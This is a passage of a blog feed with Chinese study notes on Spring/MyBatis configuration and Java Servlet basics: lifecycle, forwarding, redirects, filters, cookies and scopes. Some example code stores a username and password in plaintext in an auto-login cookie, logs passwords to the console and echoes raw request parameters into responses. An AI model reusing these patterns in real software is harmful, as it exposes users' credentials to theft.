扫描classpath下mapper文件夹中所有xml--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        整合mappers映射器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapperLocations&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath*:mappers/**/*.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        可以加载mybatis配置--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;mybatis-spring:scan base-package=&quot;dm.demo.**.mapper&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- DAO接口所在包名，Spring会自动查找其下的类 ,包下的类需要使用@MapperScan注解,否则容器注入会失败 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dm.demo.**.mapper&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionFactoryBeanName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;import resource=&quot;applicationContext-bean.xml&quot;/&gt;--&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p><img src="https://csn.damyoung.cn/image-20201223125210018.png" alt="image-20201223125210018"></p>
]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Servlet</title>
    <url>/2020/11/11/03Servlet/</url>
    <content><![CDATA[<p><strong>URL</strong>是统一资源定位符，对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。</p>
<p>基本URL包含模式（或称协议）、服务器名称（或IP地址）、路径和文件名</p>
<p>如“协议：//授权/路径?查询”。</p>
<p><strong>URI：</strong>不包括http 和localhost</p>
<ul>
<li><strong>封装JavaBean对象，属性要与构造方法相同，不然会出NullPointException</strong></li>
</ul>
<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><blockquote>
<p>为保证线程安全，不要为Servlet设置成员变量，这种没有任何成员变量的类是线程安全的</p>
<p>因为成员变量保存的数据也可以成为状态信息，没有成员变量称为【无状态】</p>
</blockquote>
<p>是运行在Web服务器的小型Java程序，即<strong>服务器端小应用程序</strong></p>
<p>通过HTTP(超文本传输协议) <strong>接收和响应Web客户端</strong>的请求</p>
<h3 id="编写Servlet程序"><a href="#编写Servlet程序" class="headerlink" title="编写Servlet程序"></a>编写Servlet程序</h3><p>1、实现Servlet接口</p>
<p><img src="https://csn.damyoung.cn/image-20200911090821515.png" alt="image-20200911090821515"></p>
<p>2、修改web.xml文件</p>
<p><img src="https://csn.damyoung.cn/image-20200911091443831.png" alt="image-20200911091443831"></p>
<p>3、部署到tomcat服务器</p>
<p>4、测试 <a href="http://localhost:8080/demo1">http://localhost:8080/demo1</a></p>
<h3 id="1、生命周期"><a href="#1、生命周期" class="headerlink" title="1、生命周期"></a>1、生命周期</h3><p>实例化–初始化–服务–销毁</p>
<ul>
<li>init：只会调用一次，在创建servlet实例的时候才会创建</li>
<li>service：进行数据处理，只要接受一次请求，就会调用一次</li>
<li>destroy：销毁servlet对象时调用。停止服务器或重新部署web应用时</li>
</ul>
<img src="https://csn.damyoung.cn/image-20200911093556913.png" alt="image-20200911093556913" style="zoom: 80%;" />

<img src="https://csn.damyoung.cn/image-20200911093611285.png" alt="image-20200911093611285" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20200911093623975.png" alt="image-20200911093623975" style="zoom:67%;" />

<p><img src="https://csn.damyoung.cn/image-20200911093654231.png" alt="image-20200911093654231"></p>
<h3 id="2、Servlet创建方式"><a href="#2、Servlet创建方式" class="headerlink" title="2、Servlet创建方式"></a>2、Servlet创建方式</h3><p>1、实现javax.servlet.Servlet接口</p>
<p>2、继承javax.servlet.GenericServlet类（适配器模式）</p>
<p><img src="https://csn.damyoung.cn/image-20200911102435492.png" alt="image-20200911102435492"></p>
<p>3、继承javax.servlet.http.HttpServlet类（模板方法模式）</p>
<ul>
<li>Servlet–GenericServlet–HttpServlet</li>
</ul>
<img src="https://csn.damyoung.cn/image-20200911112518725.png" alt="image-20200911112518725" style="zoom:80%;" />

<h4 id="接收请求和响应"><a href="#接收请求和响应" class="headerlink" title="接收请求和响应"></a>接收请求和响应</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接收数据</span></span><br><span class="line">String username=request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">String password=request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">System.out.println(request.getRemoteAddr()+username+<span class="string">&quot;..&quot;</span>+password);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//响应数据</span></span><br><span class="line"><span class="comment">//字节流</span></span><br><span class="line">PrintWriter out=response.getWriter();</span><br><span class="line">out.write(<span class="string">&quot;获取数据成功&quot;</span>);</span><br><span class="line"> <span class="comment">//字符流</span></span><br><span class="line">ServletOutputStream out=response.getOutputStream();</span><br><span class="line">out.write(<span class="string">&quot;获取数据成功&quot;</span>.getBytes());</span><br></pre></td></tr></table></figure>

<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务器默认使用ISO-8859-1</span></span><br><span class="line">request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="映射路径"><a href="#映射路径" class="headerlink" title="映射路径"></a>映射路径</h4><p>匹配顺序：精确匹配&gt;路径匹配&gt;扩展名匹配&gt;缺省匹配</p>
<p>（1）配置多个映射路径</p>
<img src="https://csn.damyoung.cn/image-20200911100234541.png" alt="image-20200911100234541" style="zoom:80%;" />

<p>（2）通配符</p>
<p><img src="https://csn.damyoung.cn/image-20200911100832172.png" alt="image-20200911100832172"></p>
<ul>
<li><p>*<strong>.</strong>    以任意路径映射到这个servlet， 如 xx.</p>
</li>
<li><p>*<em>/**</em>     任意路径映射到这个servlet，    如  /xxxx</p>
</li>
<li><p>*<em>/action/**</em>           以  /action 下的任意路径的请求都可以访问</p>
</li>
</ul>
<p>（3）优先级</p>
<p>绝对匹配&gt;/开头匹配&gt;扩展名方式匹配</p>
<h4 id="servlet自动加载"><a href="#servlet自动加载" class="headerlink" title="servlet自动加载"></a>servlet自动加载</h4><p>servlet只有在第一次被访问的时候才会加载，这肯定会造成第一个访问的人访问时间较长，因为他需要等待servlet完成加载</p>
<img src="https://csn.damyoung.cn/image-20200911110306560.png" alt="image-20200911110306560" style="zoom:80%;" />

<h3 id="3、servlet配置方式"><a href="#3、servlet配置方式" class="headerlink" title="3、servlet配置方式"></a>3、servlet配置方式</h3><h4 id="（1）在web-xml文件中配置"><a href="#（1）在web-xml文件中配置" class="headerlink" title="（1）在web.xml文件中配置"></a>（1）在web.xml文件中配置</h4><h4 id="（2）注解方式"><a href="#（2）注解方式" class="headerlink" title="（2）注解方式"></a>（2）注解方式</h4><p>@WebServlet（”/xxx”）<strong>必须加上斜杆</strong></p>
<p>value等价urlPatterns 类型 String[]   可以使用数组方式：urlPatterns={“/servlet/url1”,”/servlet/url2”}</p>
<p><img src="https://csn.damyoung.cn/image-20200911105435675.png" alt="image-20200911105435675"></p>
<p>访问/demo2的时候，服务器同样就会将处理交由Servlet1进行处理</p>
<h3 id="4、Servlet对象"><a href="#4、Servlet对象" class="headerlink" title="4、Servlet对象"></a>4、Servlet对象</h3><p>HttpServletRequest 请求对象：获取请求信息</p>
<p>HttpServletResponse 响应对象：设置响应对象</p>
<h4 id="（1）ServletConfig"><a href="#（1）ServletConfig" class="headerlink" title="**（1）ServletConfig  **"></a>**（1）ServletConfig  **</h4><h5 id="获取servlet配置对象"><a href="#获取servlet配置对象" class="headerlink" title="获取servlet配置对象"></a><strong>获取servlet配置对象</strong></h5><ul>
<li>getInitParameter() 根据参数名获取参数值</li>
<li>getInitParameterNames()  获取所有参数</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200911115059752.png" alt="image-20200911115059752"></p>
<h5 id="得到ServletContext对象"><a href="#得到ServletContext对象" class="headerlink" title="得到ServletContext对象"></a>得到ServletContext对象</h5><h4 id="（2）ServletContext"><a href="#（2）ServletContext" class="headerlink" title="**（2）ServletContext **"></a>**（2）ServletContext **</h4><p><strong>application域对象，在一定范围内，使多个Servlet共享数据</strong></p>
<p>又叫Servlet上下文，代表当前整个应用程序，Web服务器启动时，会为每一个Web应用程序创建的一个共享的存储区域，在服务器启动时创建，关闭时销毁</p>
<h5 id="获取方式"><a href="#获取方式" class="headerlink" title="获取方式"></a>获取方式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一种方法：</span></span><br><span class="line">ServletContext application = <span class="keyword">this</span>.getServletContext();</span><br><span class="line"><span class="comment">//第二种方式：</span></span><br><span class="line">ServletContext application2 = getServletConfig().getServletContext();</span><br><span class="line"><span class="comment">//第三种方法：通过session获取,常用</span></span><br><span class="line">ServletContext application3 = request.getSession().getServletContext();</span><br><span class="line"><span class="comment">//第四种方式：通过Request，最常用</span></span><br><span class="line">ServletContext application4 = request.getServletContext();</span><br></pre></td></tr></table></figure>

<h5 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取路径信息(上下文路径）</span></span><br><span class="line">String path3 = application.getContextPath();<span class="comment">//项目根路径</span></span><br><span class="line"><span class="comment">//在上下文存储信息</span></span><br><span class="line">application.setAttribute(<span class="string">&quot;welcome&quot;</span>,<span class="string">&quot;在其他页面获取上下文也可以读到&quot;</span>);</span><br><span class="line"><span class="comment">//读取上下文信息</span></span><br><span class="line">Object attribute = application.getAttribute(<span class="string">&quot;welcome&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//已知相对路径，求绝对路径</span></span><br><span class="line">ServletContext servletContext=<span class="keyword">this</span>.getServletContext();</span><br><span class="line">System.out.println(servletContext.getRealPath(<span class="string">&quot;web\\login.html&quot;</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.getServletContext().setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">Object attribute = <span class="keyword">this</span>.getServletContext().getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">resp.getWriter().write(attribute.toString());</span><br></pre></td></tr></table></figure>

<h4 id="（3）Http-Servlet-response"><a href="#（3）Http-Servlet-response" class="headerlink" title="（3）Http Servlet response"></a>（3）Http Servlet response</h4><p><strong>HttpServletResponse</strong>对象代表服务器的响应，封装了向客户端<strong>发送数据、发送响应头、发送响应状态码</strong></p>
<h5 id="跳转刷新"><a href="#跳转刷新" class="headerlink" title="跳转刷新"></a>跳转刷新</h5><p><strong>response.setHeader(“refresh”,” ?; url=   “)</strong></p>
<p><strong>url为绝对路径</strong></p>
<ul>
<li><strong>发送http头</strong>，控制浏览器定时刷新网页</li>
<li>输出一个随机数，控制浏览器每2s刷新一次</li>
<li>利用Refresh刷新到其他组件</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200913151857738.png" alt="image-20200913151857738"></p>
<h5 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h5><p><strong>response.sendRedirect()</strong></p>
<p><strong>实现原理：</strong>302/307状态码和location即可实现重定向</p>
<p><strong>当一个web资源收到客服端请求后，通知客户端去访问另外一个web资源，称为请求重定向</strong></p>
<ul>
<li>客服端发出2次请求，服务端的俩个程序有各自的请求和响应对象，地址栏是变换的</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200913161050799.png" alt="image-20200913161050799"></p>
<p><img src="https://csn.damyoung.cn/image-20200913161103773.png" alt="image-20200913161103773"></p>
<h4 id="（4）HttpServletRequest"><a href="#（4）HttpServletRequest" class="headerlink" title="（4）HttpServletRequest"></a>（4）HttpServletRequest</h4><p><strong>request作为web资源，只能是转发，重定向无效</strong></p>
<p><strong>域对象</strong></p>
<p>代表客户端的请求，当客户端通过Http协议访问服务器时，Http请求头中的所有信息都封装在这个对象中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(request.getMethod());</span><br><span class="line">System.out.println(request.getRequestURL());</span><br><span class="line">System.out.println(request.getRequestURI());</span><br><span class="line">System.out.println(request.getContextPath());</span><br><span class="line">System.out.println(request.getQueryString());</span><br><span class="line"><span class="comment">//返回发出请求的客户机的IP地址</span></span><br><span class="line">System.out.println(request.getRemoteAddr());</span><br><span class="line"><span class="comment">//返回发出请求的客户机的 完整主机名</span></span><br><span class="line">System.out.println(request.getRemoteHost());</span><br><span class="line"><span class="comment">//返回发出请求的客户机的 网络端口号</span></span><br><span class="line">System.out.println(request.getRemotePort());</span><br><span class="line"></span><br><span class="line"><span class="comment">//web服务器的ip地址</span></span><br><span class="line">System.out.println(request.getLocalAddr());</span><br><span class="line"><span class="comment">//web服务器的主机名</span></span><br><span class="line">System.out.println(request.getLocalName());</span><br></pre></td></tr></table></figure>

<h5 id="接收请求"><a href="#接收请求" class="headerlink" title="接收请求"></a>接收请求</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">String name=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">String pwd=req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">resp.getWriter().write(name);</span><br><span class="line">resp.getWriter().write(pwd);</span><br><span class="line">System.out.println(<span class="string">&quot;用户名&quot;</span>+name+<span class="string">&quot;密码&quot;</span>+pwd);</span><br></pre></td></tr></table></figure>

<h5 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h5><p>路径必须为相对路径，加上/  </p>
<p><strong>getRequestDispatcher(String path)</strong> 参数表示传到哪里去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> resp.getWriter().write(<span class="string">&quot;工商局收到老汉提交的资料&lt;br/&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//转发</span></span><br><span class="line">req.getRequestDispatcher(<span class="string">&quot;RequestSendDemo2&quot;</span>).forward(req, resp);</span><br><span class="line">resp.getWriter().write(<span class="string">&quot;工商局收到审批文件，工商再办证给老汉&lt;/br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h6 id="forward"><a href="#forward" class="headerlink" title="forward()"></a>forward()</h6><p>会先清空用于存放响应正文数据的缓冲区，源组件生成的响应结果不会被发送到客户端，只有目标组件生成的响应结果才会发送到客户端</p>
<h6 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h6><p><img src="https://csn.damyoung.cn/image-20200914164513879.png" alt="image-20200914164513879"></p>
<h4 id="（5）转发与重定向"><a href="#（5）转发与重定向" class="headerlink" title="（5）转发与重定向"></a>（5）转发与重定向</h4><p><strong>转发</strong></p>
<ul>
<li>A要跳转到C网页，A需要先请求到B，B带领着A去请求C，相当于是A<strong>只请求了一次</strong>。</li>
<li>请求的网址不改变，请求的次数一次，可后退，刷新重新提交表单</li>
<li>服务器行为，只做一次访问请求，<strong>浏览器地址不变</strong></li>
</ul>
<p><strong>重定向</strong></p>
<ul>
<li>A要请求C，A先请求B，B把C的网址给到A，A再去请求C，则A<strong>请求了2次</strong></li>
<li>请求的网址改变，请求次数两次，不可后退，刷新不变</li>
<li>客户端行为(浏览器重新访问)、至少做两次访问请求、<strong>浏览器地址改变</strong></li>
</ul>
<h3 id="5、线程安全"><a href="#5、线程安全" class="headerlink" title="5、线程安全"></a>5、线程安全</h3><p><strong>每次请求都会创建一个线程</strong>。如果多人同时请求，就会存在多个线程操作一个Servlet对象，如果在对应的方法中操作了成员变量，就会产生线程安全问题</p>
<ul>
<li>将存在线程安全问题的代码放在同步代码块中synchronized</li>
<li>尽可能使用基本不变量，防止使用成员变量</li>
</ul>
<h3 id="6、过滤器"><a href="#6、过滤器" class="headerlink" title="6、过滤器"></a>6、过滤器</h3><blockquote>
<p>实现权限访问控制、过滤敏感词汇、压缩响应信息</p>
<p><strong>实现过滤拦截，放行后，若不是重定向，则request转发到 受拦截的URI地址上</strong></p>
</blockquote>
<h4 id="6-1-API"><a href="#6-1-API" class="headerlink" title="6.1 API"></a>6.1 API</h4><ul>
<li>destroy()  销毁</li>
<li>doFilter()  每次访问执行一次</li>
<li>init()  初始化</li>
</ul>
<h4 id="6-2-配置过滤器"><a href="#6-2-配置过滤器" class="headerlink" title="6.2 配置过滤器"></a>6.2 配置过滤器</h4><p><strong>注解：</strong>@WebFilter(“/yourFilter”)</p>
<p><strong>xml文件：</strong></p>
<p><img src="https://csn.damyoung.cn/image-20200913205457410.png" alt="image-20200913205457410"></p>
<h4 id="6-3-多个过滤器执行顺序"><a href="#6-3-多个过滤器执行顺序" class="headerlink" title="6.3 多个过滤器执行顺序"></a>6.3 多个过滤器执行顺序</h4><p>注解优先级别设定</p>
<p>在xml中，排前面的<code>filter-mapping</code>优先执行</p>
<p>在注解中按照类名的<strong>字符串排序</strong>进行作用</p>
<h4 id="6-4-登录过滤"><a href="#6-4-登录过滤" class="headerlink" title="6.4 登录过滤"></a>6.4 登录过滤</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest req=(HttpServletRequest)servletRequest;</span><br><span class="line">    HttpServletResponse resp= (HttpServletResponse) servletResponse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获得请求的URI</span></span><br><span class="line">    String uri = req.getRequestURI();</span><br><span class="line">    System.out.println(uri);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果请求是以下uri时,则请求直接放行,其他请求一律要进行登录验证，防止为授权访问</span></span><br><span class="line">    <span class="comment">//1、User非空说明登录验证成功,是正确的登录用户(登录验证已经在LoginServlet进行),直接放行即可</span></span><br><span class="line">    <span class="comment">//2、为空说明非法登录或是登录错误用户</span></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="string">&quot;/shop/login&quot;</span>.equals(uri) || <span class="string">&quot;/shop/login.jsp&quot;</span>.equals(uri)))&#123;</span><br><span class="line">        User user = (User) req.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//已经登录都放行</span></span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//没有session，说明是非法</span></span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;请先登录!&quot;</span>);</span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;login.jsp&quot;</span>).forward(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//资源放行，只有这句话执行才能继续访问</span></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6-4-2-登录记住账号密码-转发"><a href="#6-4-2-登录记住账号密码-转发" class="headerlink" title="6.4.2 登录记住账号密码 转发"></a>6.4.2 登录记住账号密码 转发</h5><ul>
<li>LoginServlet设置Cookie</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Cookie记住用户名</span></span><br><span class="line">Cookie cookie1 = <span class="keyword">new</span> Cookie(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line">String remember = req.getParameter(<span class="string">&quot;remember&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (remember!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    cookie1.setMaxAge(<span class="number">60</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    cookie1.setMaxAge(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">resp.addCookie(cookie1);</span><br></pre></td></tr></table></figure>

<p><strong>过滤器拦截放行，通过request转发传递Cookie</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie[] cookies = request.getCookies();</span><br><span class="line"><span class="keyword">if</span> (cookies!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (Cookie cookie:cookies)&#123;</span><br><span class="line">        <span class="keyword">if</span> (cookie.getName().equals(<span class="string">&quot;username&quot;</span>)) &#123;</span><br><span class="line">            String username = cookie.getValue();</span><br><span class="line">            request.setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">            String checkState = <span class="string">&quot;checked=&#x27;checked&#x27;&quot;</span>;</span><br><span class="line">            <span class="comment">//设置request域</span></span><br><span class="line">            request.setAttribute(<span class="string">&quot;checkState&quot;</span>, checkState);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//放行 相当于转发，表示重定向，request的值都能传递过去</span></span><br><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br></pre></td></tr></table></figure>

<h5 id="6-4-3-自动登录"><a href="#6-4-3-自动登录" class="headerlink" title="6.4.3 自动登录"></a>6.4.3 自动登录</h5><ul>
<li>loginServlet 设置Cookie</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Cookie自动登录</span></span><br><span class="line"><span class="comment">//admin&amp;123</span></span><br><span class="line">Cookie cookie2=<span class="keyword">new</span> Cookie(<span class="string">&quot;user&quot;</span>, user.getUsername()+<span class="string">&quot;&amp;&quot;</span>+user.getPassword());</span><br><span class="line">String autologin=req.getParameter(<span class="string">&quot;autologin&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (autologin!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    cookie2.setMaxAge(<span class="number">60</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    cookie2.setMaxAge(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">resp.addCookie(cookie2);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="keyword">if</span> (cookies!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cookie cookie:cookies)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;user&quot;</span>.equals(cookie.getName())) &#123;</span><br><span class="line">                    String username=cookie.getValue().split(<span class="string">&quot;&amp;&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                    String password = cookie.getValue().split(<span class="string">&quot;&amp;&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">                    User user=<span class="keyword">new</span> LoginService().login(username,password);</span><br><span class="line">                    <span class="keyword">if</span> (user!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                        HttpSession session = req.getSession();</span><br><span class="line">                        session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">                        req.getRequestDispatcher(<span class="string">&quot;bookStoreShow1&quot;</span>).forward(servletRequest, servletResponse);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br></pre></td></tr></table></figure>

<h4 id="6-5-过滤器处理浏览器缓存"><a href="#6-5-过滤器处理浏览器缓存" class="headerlink" title="6.5 过滤器处理浏览器缓存"></a>6.5 过滤器处理浏览器缓存</h4><p>当向服务器请求html界面时，第一次服务器会创建一个缓存区，将资源放入缓存区，当客户端第二次进行访问时，服务器根据时间判断如果是同一个资源且没有更新，就直接返回缓存区资源并且返回<strong>304状态码</strong>，同时浏览器也会在本地缓存资源，当关闭浏览器重新打开或打开新页面时进行访问时，浏览器会从<strong>本地缓存查找</strong>，如果有就返回<code>200(from disk cache)</code>,再次刷新返回304</p>
<p><strong>避免浏览器缓存的方法</strong>：浏览器还是会缓存，只是控制每次都是第一次访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;开始执行过滤&quot;</span>);</span><br><span class="line">    HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">    HttpServletResponse response = (HttpServletResponse) resp;</span><br><span class="line">    response.setDateHeader(<span class="string">&quot;Expires&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Pragma&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">    chain.doFilter(req, resp);<span class="comment">//资源放行，只有这句话执行才能继续访问</span></span><br><span class="line">    </span><br><span class="line">    System.out.println(<span class="string">&quot;过滤完成&quot;</span>);</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="7、封装表单元素"><a href="#7、封装表单元素" class="headerlink" title="7、封装表单元素"></a>7、封装表单元素</h3><h4 id="（1）getParameter"><a href="#（1）getParameter" class="headerlink" title="（1）getParameter"></a>（1）getParameter</h4><p><img src="https://csn.damyoung.cn/image-20200914001911034.png" alt="image-20200914001911034"></p>
<h4 id="（2）getParameterMap"><a href="#（2）getParameterMap" class="headerlink" title="（2）getParameterMap"></a>（2）getParameterMap</h4><p><img src="https://csn.damyoung.cn/image-20200914001945037.png" alt="image-20200914001945037"></p>
<h4 id="（3）导入BeanUtils"><a href="#（3）导入BeanUtils" class="headerlink" title="（3）导入BeanUtils"></a>（3）导入BeanUtils</h4><p><strong>实体类变量应该与表单一致</strong></p>
<p>导入三个包（将包放在tomcat/bin目录下）</p>
<p>commons-beautils</p>
<p>commons-collections</p>
<p>commons-logging</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Emp emp=<span class="keyword">new</span> Emp();</span><br><span class="line">System.out.println(<span class="string">&quot;封装数据前&quot;</span>+emp);</span><br><span class="line">BeanUtils.populate(emp,req.getParameterMap());</span><br><span class="line">System.out.println(<span class="string">&quot;封装数据后&quot;</span>+emp);</span><br></pre></td></tr></table></figure>

<h4 id="（4）getParameter用法"><a href="#（4）getParameter用法" class="headerlink" title="（4）getParameter用法"></a>（4）getParameter用法</h4><ul>
<li>获取表单name属性</li>
<li>获取超链接属性</li>
</ul>
<blockquote>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;delBook?id=$&#123;li.id&#125;&quot; onclick=&quot;return confirm(&#x27;确认删除$&#123;li.name&#125;?&#x27;)&quot;&gt;删除&lt;/a&gt;</span><br><span class="line">req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="8、域对象"><a href="#8、域对象" class="headerlink" title="8、域对象"></a>8、域对象</h3><p>之所以他们是域对象，原因就是他们都内置了<strong>map集合</strong>，都有<code>setAttribute getAttribute</code>方法。 他们都有自己固定的生命周期和作用域。    </p>
<h4 id="（1）ServletContext"><a href="#（1）ServletContext" class="headerlink" title="（1）ServletContext"></a>（1）ServletContext</h4><p>Application</p>
<p>生命周期：<strong>随着服务器或Web应用</strong></p>
<p>作用范围：整个Web应用</p>
<p>作用：在不同Servlet之间转发</p>
<ul>
<li>通过重定向和转发传递数据</li>
</ul>
<h4 id="（2）Session域"><a href="#（2）Session域" class="headerlink" title="（2）Session域"></a>（2）Session域</h4><p>生命周期：调用equest.getSession() 方法时，服务器会检查是否已经有对应的session,如果没有就在内存 中创建一个session并返回。<strong>浏览器关闭也会被销毁，被浏览器独享</strong>。</p>
<p>作用范围：一次会话（可为多个Servlet共享）</p>
<h4 id="（3）request域"><a href="#（3）request域" class="headerlink" title="（3）request域"></a>（3）request域</h4><p>生命周期:<strong>请求结束</strong>，request生命结束</p>
<p>作用范围：<strong>整个请求链</strong>，只能是在<strong>一次转发有效</strong></p>
